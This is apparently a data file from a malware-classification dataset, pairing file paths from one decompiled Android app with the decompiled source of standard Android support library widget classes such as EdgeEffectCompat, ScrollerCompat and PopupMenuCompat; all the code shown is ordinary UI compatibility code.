"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\DrawerListener.code","public interface DrawerListener {   void onDrawerClosed(  View view);   void onDrawerOpened(  View view);   void onDrawerSlide(  View view,  float f);   void onDrawerStateChanged(  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\EdgeEffectCompat.code","public class EdgeEffectCompat {   private static final EdgeEffectImpl IMPL;   private Object mEdgeEffect; interface EdgeEffectImpl {     boolean draw(    Object obj,    Canvas canvas);     void finish(    Object obj);     boolean isFinished(    Object obj);     Object newEdgeEffect(    Context context);     boolean onAbsorb(    Object obj,    int i);     boolean onPull(    Object obj,    float f);     boolean onRelease(    Object obj);     void setSize(    Object obj,    int i,    int i2);   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new EdgeEffectIcsImpl();     }  else {       IMPL=new BaseEdgeEffectImpl();     }   } static class BaseEdgeEffectImpl implements EdgeEffectImpl {     BaseEdgeEffectImpl(){     }     @Override public Object newEdgeEffect(    Context context){       return null;     }     @Override public void setSize(    Object edgeEffect,    int width,    int height){     }     @Override public boolean isFinished(    Object edgeEffect){       return true;     }     @Override public void finish(    Object edgeEffect){     }     @Override public boolean onPull(    Object edgeEffect,    float deltaDistance){       return false;     }     @Override public boolean onRelease(    Object edgeEffect){       return false;     }     @Override public boolean onAbsorb(    Object edgeEffect,    int velocity){       return false;     }     @Override public boolean draw(    Object edgeEffect,    Canvas canvas){       return false;     }   } static class EdgeEffectIcsImpl implements EdgeEffectImpl {     EdgeEffectIcsImpl(){     }     @Override public Object newEdgeEffect(    Context context){       return EdgeEffectCompatIcs.newEdgeEffect(context);     }     @Override public void setSize(    Object edgeEffect,    int width,    int height){       EdgeEffectCompatIcs.setSize(edgeEffect,width,height);     }     @Override public boolean isFinished(    Object edgeEffect){       return EdgeEffectCompatIcs.isFinished(edgeEffect);     }     @Override public void finish(    Object edgeEffect){       EdgeEffectCompatIcs.finish(edgeEffect);     }     @Override public boolean onPull(    Object edgeEffect,    float deltaDistance){       return EdgeEffectCompatIcs.onPull(edgeEffect,deltaDistance);     }     @Override public boolean onRelease(    Object edgeEffect){       return EdgeEffectCompatIcs.onRelease(edgeEffect);     }     @Override public boolean onAbsorb(    Object edgeEffect,    int velocity){       return EdgeEffectCompatIcs.onAbsorb(edgeEffect,velocity);     }     @Override public boolean draw(    Object edgeEffect,    Canvas canvas){       return EdgeEffectCompatIcs.draw(edgeEffect,canvas);     }   }   public EdgeEffectCompat(  Context context){     this.mEdgeEffect=IMPL.newEdgeEffect(context);   }   public void setSize(  int width,  int height){     IMPL.setSize(this.mEdgeEffect,width,height);   }   public boolean isFinished(){     return IMPL.isFinished(this.mEdgeEffect);   }   public void finish(){     IMPL.finish(this.mEdgeEffect);   }   public boolean onPull(  float deltaDistance){     return IMPL.onPull(this.mEdgeEffect,deltaDistance);   }   public boolean onRelease(){     return IMPL.onRelease(this.mEdgeEffect);   }   public boolean onAbsorb(  int velocity){     return IMPL.onAbsorb(this.mEdgeEffect,velocity);   }   public boolean draw(  Canvas canvas){     return IMPL.draw(this.mEdgeEffect,canvas);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\EdgeEffectCompatIcs.code","class EdgeEffectCompatIcs {   EdgeEffectCompatIcs(){   }   public static Object newEdgeEffect(  Context context){     return new EdgeEffect(context);   }   public static void setSize(  Object edgeEffect,  int width,  int height){     ((EdgeEffect)edgeEffect).setSize(width,height);   }   public static boolean isFinished(  Object edgeEffect){     return ((EdgeEffect)edgeEffect).isFinished();   }   public static void finish(  Object edgeEffect){     ((EdgeEffect)edgeEffect).finish();   }   public static boolean onPull(  Object edgeEffect,  float deltaDistance){     ((EdgeEffect)edgeEffect).onPull(deltaDistance);     return true;   }   public static boolean onRelease(  Object edgeEffect){     EdgeEffect eff=(EdgeEffect)edgeEffect;     eff.onRelease();     return eff.isFinished();   }   public static boolean onAbsorb(  Object edgeEffect,  int velocity){     ((EdgeEffect)edgeEffect).onAbsorb(velocity);     return true;   }   public static boolean draw(  Object edgeEffect,  Canvas canvas){     return ((EdgeEffect)edgeEffect).draw(canvas);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\EdgeEffectIcsImpl.code","static class EdgeEffectIcsImpl implements EdgeEffectImpl {   EdgeEffectIcsImpl(){   }   @Override public Object newEdgeEffect(  Context context){     return EdgeEffectCompatIcs.newEdgeEffect(context);   }   @Override public void setSize(  Object edgeEffect,  int width,  int height){     EdgeEffectCompatIcs.setSize(edgeEffect,width,height);   }   @Override public boolean isFinished(  Object edgeEffect){     return EdgeEffectCompatIcs.isFinished(edgeEffect);   }   @Override public void finish(  Object edgeEffect){     EdgeEffectCompatIcs.finish(edgeEffect);   }   @Override public boolean onPull(  Object edgeEffect,  float deltaDistance){     return EdgeEffectCompatIcs.onPull(edgeEffect,deltaDistance);   }   @Override public boolean onRelease(  Object edgeEffect){     return EdgeEffectCompatIcs.onRelease(edgeEffect);   }   @Override public boolean onAbsorb(  Object edgeEffect,  int velocity){     return EdgeEffectCompatIcs.onAbsorb(edgeEffect,velocity);   }   @Override public boolean draw(  Object edgeEffect,  Canvas canvas){     return EdgeEffectCompatIcs.draw(edgeEffect,canvas);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\EdgeEffectImpl.code","interface EdgeEffectImpl {   boolean draw(  Object obj,  Canvas canvas);   void finish(  Object obj);   boolean isFinished(  Object obj);   Object newEdgeEffect(  Context context);   boolean onAbsorb(  Object obj,  int i);   boolean onPull(  Object obj,  float f);   boolean onRelease(  Object obj);   void setSize(  Object obj,  int i,  int i2); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ExploreByTouchHelper.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7f9ffbad"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ExploreByTouchNodeProvider.code","private class ExploreByTouchNodeProvider extends AccessibilityNodeProviderCompat {   private ExploreByTouchNodeProvider(){   }   @Override public AccessibilityNodeInfoCompat createAccessibilityNodeInfo(  int virtualViewId){     return ExploreByTouchHelper.this.createNode(virtualViewId);   }   @Override public boolean performAction(  int virtualViewId,  int action,  Bundle arguments){     return ExploreByTouchHelper.this.performAction(virtualViewId,action,arguments);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\KitKatListPopupWindowImpl.code","static class KitKatListPopupWindowImpl extends BaseListPopupWindowImpl {   KitKatListPopupWindowImpl(){   }   @Override public View.OnTouchListener createDragToOpenListener(  Object listPopupWindow,  View src){     return ListPopupWindowCompatKitKat.createDragToOpenListener(listPopupWindow,src);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\KitKatPopupMenuImpl.code","static class KitKatPopupMenuImpl extends BasePopupMenuImpl {   KitKatPopupMenuImpl(){   }   @Override public View.OnTouchListener getDragToOpenListener(  Object popupMenu){     return PopupMenuCompatKitKat.getDragToOpenListener(popupMenu);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\LayoutParams.code","public static class LayoutParams extends ViewGroup.MarginLayoutParams {   public int gravity;   boolean isPeeking;   boolean knownOpen;   float onScreen;   public LayoutParams(  Context c,  AttributeSet attrs){     super(c,attrs);     this.gravity=0;     TypedArray a2=c.obtainStyledAttributes(attrs,DrawerLayout.LAYOUT_ATTRS);     this.gravity=a2.getInt(0,0);     a2.recycle();   }   public LayoutParams(  int width,  int height){     super(width,height);     this.gravity=0;   }   public LayoutParams(  int width,  int height,  int gravity){     this(width,height);     this.gravity=gravity;   }   public LayoutParams(  LayoutParams source){     super((ViewGroup.MarginLayoutParams)source);     this.gravity=0;     this.gravity=source.gravity;   }   public LayoutParams(  ViewGroup.LayoutParams source){     super(source);     this.gravity=0;   }   public LayoutParams(  ViewGroup.MarginLayoutParams source){     super(source);     this.gravity=0;   } } public static class LayoutParams extends ViewGroup.MarginLayoutParams {   private static final int[] ATTRS={R.attr.layout_weight};   Paint dimPaint;   boolean dimWhenOffset;   boolean slideable;   public float weight;   public LayoutParams(){     super(-1,-1);     this.weight=0.0f;   }   public LayoutParams(  int width,  int height){     super(width,height);     this.weight=0.0f;   }   public LayoutParams(  ViewGroup.LayoutParams source){     super(source);     this.weight=0.0f;   }   public LayoutParams(  ViewGroup.MarginLayoutParams source){     super(source);     this.weight=0.0f;   }   public LayoutParams(  LayoutParams source){     super((ViewGroup.MarginLayoutParams)source);     this.weight=0.0f;     this.weight=source.weight;   }   public LayoutParams(  Context c,  AttributeSet attrs){     super(c,attrs);     this.weight=0.0f;     TypedArray a2=c.obtainStyledAttributes(attrs,ATTRS);     this.weight=a2.getFloat(0,0.0f);     a2.recycle();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ListPopupWindowCompat.code","public class ListPopupWindowCompat {   static final ListPopupWindowImpl IMPL; interface ListPopupWindowImpl {     View.OnTouchListener createDragToOpenListener(    Object obj,    View view);   } static class BaseListPopupWindowImpl implements ListPopupWindowImpl {     BaseListPopupWindowImpl(){     }     @Override public View.OnTouchListener createDragToOpenListener(    Object listPopupWindow,    View src){       return null;     }   } static class KitKatListPopupWindowImpl extends BaseListPopupWindowImpl {     KitKatListPopupWindowImpl(){     }     @Override public View.OnTouchListener createDragToOpenListener(    Object listPopupWindow,    View src){       return ListPopupWindowCompatKitKat.createDragToOpenListener(listPopupWindow,src);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new KitKatListPopupWindowImpl();     }  else {       IMPL=new BaseListPopupWindowImpl();     }   }   private ListPopupWindowCompat(){   }   public static View.OnTouchListener createDragToOpenListener(  Object listPopupWindow,  View src){     return IMPL.createDragToOpenListener(listPopupWindow,src);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ListPopupWindowCompatKitKat.code","class ListPopupWindowCompatKitKat {   ListPopupWindowCompatKitKat(){   }   public static View.OnTouchListener createDragToOpenListener(  Object listPopupWindow,  View src){     return ((ListPopupWindow)listPopupWindow).createDragToOpenListener(src);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ListPopupWindowImpl.code","interface ListPopupWindowImpl {   View.OnTouchListener createDragToOpenListener(  Object obj,  View view); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ListViewAutoScrollHelper.code","public class ListViewAutoScrollHelper extends AutoScrollHelper {   private final ListView mTarget;   public ListViewAutoScrollHelper(  ListView target){     super(target);     this.mTarget=target;   }   @Override public void scrollTargetBy(  int deltaX,  int deltaY){     View firstView;     ListView target=this.mTarget;     int firstPosition=target.getFirstVisiblePosition();     if (firstPosition != -1 && (firstView=target.getChildAt(0)) != null) {       int newTop=firstView.getTop() - deltaY;       target.setSelectionFromTop(firstPosition,newTop);     }   }   @Override public boolean canTargetScrollHorizontally(  int direction){     return false;   }   @Override public boolean canTargetScrollVertically(  int direction){     ListView target=this.mTarget;     int itemCount=target.getCount();     int childCount=target.getChildCount();     int firstPosition=target.getFirstVisiblePosition();     int lastPosition=firstPosition + childCount;     if (direction > 0) {       if (lastPosition >= itemCount) {         View lastView=target.getChildAt(childCount - 1);         if (lastView.getBottom() <= target.getHeight()) {           return false;         }       }     }  else {       if (direction >= 0) {         return false;       }       if (firstPosition <= 0) {         View firstView=target.getChildAt(0);         if (firstView.getTop() >= 0) {           return false;         }       }     }     return true;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\MyDataSetObserver.code","public class MyDataSetObserver extends DataSetObserver {   private MyDataSetObserver(){   }   @Override public void onChanged(){     CursorAdapter.this.mDataValid=true;     CursorAdapter.this.notifyDataSetChanged();   }   @Override public void onInvalidated(){     CursorAdapter.this.mDataValid=false;     CursorAdapter.this.notifyDataSetInvalidated();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\MySearchView.code","public static class MySearchView extends SearchView {   public MySearchView(  Context context){     super(context);   }   @Override public void onActionViewCollapsed(){     setQuery("""",false);     super.onActionViewCollapsed();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\OnCloseListenerCompat.code","public static abstract class OnCloseListenerCompat {   final Object mListener=SearchViewCompat.IMPL.newOnCloseListener(this);   public boolean onClose(){     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\OnCloseListenerCompatBridge.code","interface OnCloseListenerCompatBridge {   boolean onClose(); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\OnQueryTextListenerCompat.code","public static abstract class OnQueryTextListenerCompat {   final Object mListener=SearchViewCompat.IMPL.newOnQueryTextListener(this);   public boolean onQueryTextSubmit(  String query){     return false;   }   public boolean onQueryTextChange(  String newText){     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\OnQueryTextListenerCompatBridge.code","interface OnQueryTextListenerCompatBridge {   boolean onQueryTextChange(  String str);   boolean onQueryTextSubmit(  String str); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\PanelSlideListener.code","public interface PanelSlideListener {   void onPanelClosed(  View view);   void onPanelOpened(  View view);   void onPanelSlide(  View view,  float f); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\PopupMenuCompat.code","public class PopupMenuCompat {   static final PopupMenuImpl IMPL; interface PopupMenuImpl {     View.OnTouchListener getDragToOpenListener(    Object obj);   } static class BasePopupMenuImpl implements PopupMenuImpl {     BasePopupMenuImpl(){     }     @Override public View.OnTouchListener getDragToOpenListener(    Object popupMenu){       return null;     }   } static class KitKatPopupMenuImpl extends BasePopupMenuImpl {     KitKatPopupMenuImpl(){     }     @Override public View.OnTouchListener getDragToOpenListener(    Object popupMenu){       return PopupMenuCompatKitKat.getDragToOpenListener(popupMenu);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new KitKatPopupMenuImpl();     }  else {       IMPL=new BasePopupMenuImpl();     }   }   private PopupMenuCompat(){   }   public static View.OnTouchListener getDragToOpenListener(  Object popupMenu){     return IMPL.getDragToOpenListener(popupMenu);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\PopupMenuCompatKitKat.code","class PopupMenuCompatKitKat {   PopupMenuCompatKitKat(){   }   public static View.OnTouchListener getDragToOpenListener(  Object popupMenu){     return ((PopupMenu)popupMenu).getDragToOpenListener();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\PopupMenuImpl.code","interface PopupMenuImpl {   View.OnTouchListener getDragToOpenListener(  Object obj); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ResourceCursorAdapter.code","public abstract class ResourceCursorAdapter extends CursorAdapter {   private int mDropDownLayout;   private LayoutInflater mInflater;   private int mLayout;   @Deprecated public ResourceCursorAdapter(  Context context,  int layout,  Cursor c){     super(context,c);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   public ResourceCursorAdapter(  Context context,  int layout,  Cursor c,  boolean autoRequery){     super(context,c,autoRequery);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   public ResourceCursorAdapter(  Context context,  int layout,  Cursor c,  int flags){     super(context,c,flags);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   @Override public View newView(  Context context,  Cursor cursor,  ViewGroup parent){     return this.mInflater.inflate(this.mLayout,parent,false);   }   @Override public View newDropDownView(  Context context,  Cursor cursor,  ViewGroup parent){     return this.mInflater.inflate(this.mDropDownLayout,parent,false);   }   public void setViewResource(  int layout){     this.mLayout=layout;   }   public void setDropDownViewResource(  int dropDownLayout){     this.mDropDownLayout=dropDownLayout;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\SavedState.code","public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel source){       return new SavedState(source);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   int lockModeLeft;   int lockModeRight;   int openDrawerGravity;   public SavedState(  Parcel in){     super(in);     this.openDrawerGravity=0;     this.lockModeLeft=0;     this.lockModeRight=0;     this.openDrawerGravity=in.readInt();   }   public SavedState(  Parcelable superState){     super(superState);     this.openDrawerGravity=0;     this.lockModeLeft=0;     this.lockModeRight=0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     super.writeToParcel(dest,flags);     dest.writeInt(this.openDrawerGravity);   } } public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in){       return new SavedState(in);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   boolean isOpen;   SavedState(  Parcelable superState){     super(superState);   }   private SavedState(  Parcel in){     super(in);     this.isOpen=in.readInt() != 0;   }   @Override public void writeToParcel(  Parcel out,  int flags){     super.writeToParcel(out,flags);     out.writeInt(this.isOpen ? 1 : 0);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ScrollAnimationRunnable.code","public class ScrollAnimationRunnable implements Runnable {   private ScrollAnimationRunnable(){   }   @Override public void run(){     if (AutoScrollHelper.this.mAnimating) {       if (AutoScrollHelper.this.mNeedsReset) {         AutoScrollHelper.this.mNeedsReset=false;         AutoScrollHelper.this.mScroller.start();       }       ClampedScroller scroller=AutoScrollHelper.this.mScroller;       if (scroller.isFinished() || !AutoScrollHelper.this.shouldAnimate()) {         AutoScrollHelper.this.mAnimating=false;         return;       }       if (AutoScrollHelper.this.mNeedsCancel) {         AutoScrollHelper.this.mNeedsCancel=false;         AutoScrollHelper.this.cancelTargetTouch();       }       scroller.computeScrollDelta();       int deltaX=scroller.getDeltaX();       int deltaY=scroller.getDeltaY();       AutoScrollHelper.this.scrollTargetBy(deltaX,deltaY);       ViewCompat.postOnAnimation(AutoScrollHelper.this.mTarget,this);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ScrollerCompat.code","public class ScrollerCompat {   static final ScrollerCompatImpl IMPL;   Object mScroller; interface ScrollerCompatImpl {     void abortAnimation(    Object obj);     boolean computeScrollOffset(    Object obj);     Object createScroller(    Context context,    Interpolator interpolator);     void fling(    Object obj,    int i,    int i2,    int i3,    int i4,    int i5,    int i6,    int i7,    int i8);     void fling(    Object obj,    int i,    int i2,    int i3,    int i4,    int i5,    int i6,    int i7,    int i8,    int i9,    int i10);     float getCurrVelocity(    Object obj);     int getCurrX(    Object obj);     int getCurrY(    Object obj);     int getFinalX(    Object obj);     int getFinalY(    Object obj);     boolean isFinished(    Object obj);     boolean isOverScrolled(    Object obj);     void notifyHorizontalEdgeReached(    Object obj,    int i,    int i2,    int i3);     void notifyVerticalEdgeReached(    Object obj,    int i,    int i2,    int i3);     void startScroll(    Object obj,    int i,    int i2,    int i3,    int i4);     void startScroll(    Object obj,    int i,    int i2,    int i3,    int i4,    int i5);   } static class ScrollerCompatImplBase implements ScrollerCompatImpl {     ScrollerCompatImplBase(){     }     @Override public Object createScroller(    Context context,    Interpolator interpolator){       return interpolator != null ? new Scroller(context,interpolator) : new Scroller(context);     }     @Override public boolean isFinished(    Object scroller){       return ((Scroller)scroller).isFinished();     }     @Override public int getCurrX(    Object scroller){       return ((Scroller)scroller).getCurrX();     }     @Override public int getCurrY(    Object scroller){       return ((Scroller)scroller).getCurrY();     }     @Override public float getCurrVelocity(    Object scroller){       return 0.0f;     }     @Override public boolean computeScrollOffset(    Object scroller){       return ((Scroller)scroller).computeScrollOffset();     }     @Override public void startScroll(    Object scroller,    int startX,    int startY,    int dx,    int dy){       ((Scroller)scroller).startScroll(startX,startY,dx,dy);     }     @Override public void startScroll(    Object scroller,    int startX,    int startY,    int dx,    int dy,    int duration){       ((Scroller)scroller).startScroll(startX,startY,dx,dy,duration);     }     @Override public void fling(    Object scroller,    int startX,    int startY,    int velX,    int velY,    int minX,    int maxX,    int minY,    int maxY){       ((Scroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);     }     @Override public void fling(    Object scroller,    int startX,    int startY,    int velX,    int velY,    int minX,    int maxX,    int minY,    int maxY,    int overX,    int overY){       ((Scroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);     }     @Override public void abortAnimation(    Object scroller){       ((Scroller)scroller).abortAnimation();     }     @Override public void notifyHorizontalEdgeReached(    Object scroller,    int startX,    int finalX,    int overX){     }     @Override public void notifyVerticalEdgeReached(    Object scroller,    int startY,    int finalY,    int overY){     }     @Override public boolean isOverScrolled(    Object scroller){       return false;     }     @Override public int getFinalX(    Object scroller){       return ((Scroller)scroller).getFinalX();     }     @Override public int getFinalY(    Object scroller){       return ((Scroller)scroller).getFinalY();     }   } static class ScrollerCompatImplGingerbread implements ScrollerCompatImpl {     ScrollerCompatImplGingerbread(){     }     @Override public Object createScroller(    Context context,    Interpolator interpolator){       return ScrollerCompatGingerbread.createScroller(context,interpolator);     }     @Override public boolean isFinished(    Object scroller){       return ScrollerCompatGingerbread.isFinished(scroller);     }     @Override public int getCurrX(    Object scroller){       return ScrollerCompatGingerbread.getCurrX(scroller);     }     @Override public int getCurrY(    Object scroller){       return ScrollerCompatGingerbread.getCurrY(scroller);     }     @Override public float getCurrVelocity(    Object scroller){       return 0.0f;     }     @Override public boolean computeScrollOffset(    Object scroller){       return ScrollerCompatGingerbread.computeScrollOffset(scroller);     }     @Override public void startScroll(    Object scroller,    int startX,    int startY,    int dx,    int dy){       ScrollerCompatGingerbread.startScroll(scroller,startX,startY,dx,dy);     }     @Override public void startScroll(    Object scroller,    int startX,    int startY,    int dx,    int dy,    int duration){       ScrollerCompatGingerbread.startScroll(scroller,startX,startY,dx,dy,duration);     }     @Override public void fling(    Object scroller,    int startX,    int startY,    int velX,    int velY,    int minX,    int maxX,    int minY,    int maxY){       ScrollerCompatGingerbread.fling(scroller,startX,startY,velX,velY,minX,maxX,minY,maxY);     }     @Override public void fling(    Object scroller,    int startX,    int startY,    int velX,    int velY,    int minX,    int maxX,    int minY,    int maxY,    int overX,    int overY){       ScrollerCompatGingerbread.fling(scroller,startX,startY,velX,velY,minX,maxX,minY,maxY,overX,overY);     }     @Override public void abortAnimation(    Object scroller){       ScrollerCompatGingerbread.abortAnimation(scroller);     }     @Override public void notifyHorizontalEdgeReached(    Object scroller,    int startX,    int finalX,    int overX){       ScrollerCompatGingerbread.notifyHorizontalEdgeReached(scroller,startX,finalX,overX);     }     @Override public void notifyVerticalEdgeReached(    Object scroller,    int startY,    int finalY,    int overY){       ScrollerCompatGingerbread.notifyVerticalEdgeReached(scroller,startY,finalY,overY);     }     @Override public boolean isOverScrolled(    Object scroller){       return ScrollerCompatGingerbread.isOverScrolled(scroller);     }     @Override public int getFinalX(    Object scroller){       return ScrollerCompatGingerbread.getFinalX(scroller);     }     @Override public int getFinalY(    Object scroller){       return ScrollerCompatGingerbread.getFinalY(scroller);     }   } static class ScrollerCompatImplIcs extends ScrollerCompatImplGingerbread {     ScrollerCompatImplIcs(){     }     @Override public float getCurrVelocity(    Object scroller){       return ScrollerCompatIcs.getCurrVelocity(scroller);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 14) {       IMPL=new ScrollerCompatImplIcs();     }  else     if (version >= 9) {       IMPL=new ScrollerCompatImplGingerbread();     }  else {       IMPL=new ScrollerCompatImplBase();     }   }   public static ScrollerCompat create(  Context context){     return create(context,null);   }   public static ScrollerCompat create(  Context context,  Interpolator interpolator){     return new ScrollerCompat(context,interpolator);   }   ScrollerCompat(  Context context,  Interpolator interpolator){     this.mScroller=IMPL.createScroller(context,interpolator);   }   public boolean isFinished(){     return IMPL.isFinished(this.mScroller);   }   public int getCurrX(){     return IMPL.getCurrX(this.mScroller);   }   public int getCurrY(){     return IMPL.getCurrY(this.mScroller);   }   public int getFinalX(){     return IMPL.getFinalX(this.mScroller);   }   public int getFinalY(){     return IMPL.getFinalY(this.mScroller);   }   public float getCurrVelocity(){     return IMPL.getCurrVelocity(this.mScroller);   }   public boolean computeScrollOffset(){     return IMPL.computeScrollOffset(this.mScroller);   }   public void startScroll(  int startX,  int startY,  int dx,  int dy){     IMPL.startScroll(this.mScroller,startX,startY,dx,dy);   }   public void startScroll(  int startX,  int startY,  int dx,  int dy,  int duration){     IMPL.startScroll(this.mScroller,startX,startY,dx,dy,duration);   }   public void fling(  int startX,  int startY,  int velocityX,  int velocityY,  int minX,  int maxX,  int minY,  int maxY){     IMPL.fling(this.mScroller,startX,startY,velocityX,velocityY,minX,maxX,minY,maxY);   }   public void fling(  int startX,  int startY,  int velocityX,  int velocityY,  int minX,  int maxX,  int minY,  int maxY,  int overX,  int overY){     IMPL.fling(this.mScroller,startX,startY,velocityX,velocityY,minX,maxX,minY,maxY,overX,overY);   }   public void abortAnimation(){     IMPL.abortAnimation(this.mScroller);   }   public void notifyHorizontalEdgeReached(  int startX,  int finalX,  int overX){     IMPL.notifyHorizontalEdgeReached(this.mScroller,startX,finalX,overX);   }   public void notifyVerticalEdgeReached(  int startY,  int finalY,  int overY){     IMPL.notifyVerticalEdgeReached(this.mScroller,startY,finalY,overY);   }   public boolean isOverScrolled(){     return IMPL.isOverScrolled(this.mScroller);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ScrollerCompatGingerbread.code","class ScrollerCompatGingerbread {   ScrollerCompatGingerbread(){   }   public static Object createScroller(  Context context,  Interpolator interpolator){     return interpolator != null ? new OverScroller(context,interpolator) : new OverScroller(context);   }   public static boolean isFinished(  Object scroller){     return ((OverScroller)scroller).isFinished();   }   public static int getCurrX(  Object scroller){     return ((OverScroller)scroller).getCurrX();   }   public static int getCurrY(  Object scroller){     return ((OverScroller)scroller).getCurrY();   }   public static boolean computeScrollOffset(  Object scroller){     return ((OverScroller)scroller).computeScrollOffset();   }   public static void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy){     ((OverScroller)scroller).startScroll(startX,startY,dx,dy);   }   public static void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy,  int duration){     ((OverScroller)scroller).startScroll(startX,startY,dx,dy,duration);   }   public static void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY){     ((OverScroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);   }   public static void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY,  int overX,  int overY){     ((OverScroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY,overX,overY);   }   public static void abortAnimation(  Object scroller){     ((OverScroller)scroller).abortAnimation();   }   public static void notifyHorizontalEdgeReached(  Object scroller,  int startX,  int finalX,  int overX){     ((OverScroller)scroller).notifyHorizontalEdgeReached(startX,finalX,overX);   }   public static void notifyVerticalEdgeReached(  Object scroller,  int startY,  int finalY,  int overY){     ((OverScroller)scroller).notifyVerticalEdgeReached(startY,finalY,overY);   }   public static boolean isOverScrolled(  Object scroller){     return ((OverScroller)scroller).isOverScrolled();   }   public static int getFinalX(  Object scroller){   